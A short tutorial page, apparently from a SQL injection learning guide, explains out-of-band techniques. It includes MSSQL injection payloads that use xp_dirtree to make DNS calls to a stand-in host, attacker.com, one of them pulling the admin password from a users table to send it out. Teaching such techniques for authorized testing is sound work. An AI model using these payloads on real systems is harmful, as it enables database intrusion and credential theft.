# Out-of-Band (OAST) Techniques

Out-of-band SQL injection triggers the database to make external network connections to a server you control, allowing data exfiltration through DNS, HTTP, or other protocols.

## When to Use

Use OAST when:
- In-band techniques fail
- Application processes queries asynchronously
- Time-based is too slow
- Need to exfiltrate data quickly

## DNS Exfiltration Example

**MSSQL:**
```sql
'; exec master..xp_dirtree '//attacker.com/a'--
```

**Data Exfiltration:**
```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='admin');
exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
```

**DNS Query Received:**
```
admin_password.attacker.com
```

## Tools

- **Burp Collaborator** - Built into Burp Suite Professional
- **Interact.sh** - Free alternative
- **DNSBin** - Simple DNS logger

For complete database-specific techniques, see the [Database-Specific Syntax Cheat Sheet](../05-cheat-sheets/database-specific-syntax.md)

---

**Previous:** [Time-Based Blind SQLi](time-based.md) | **Back to:** [Boolean-Based](boolean-based.md)

**Remember: Only test on authorized systems!**
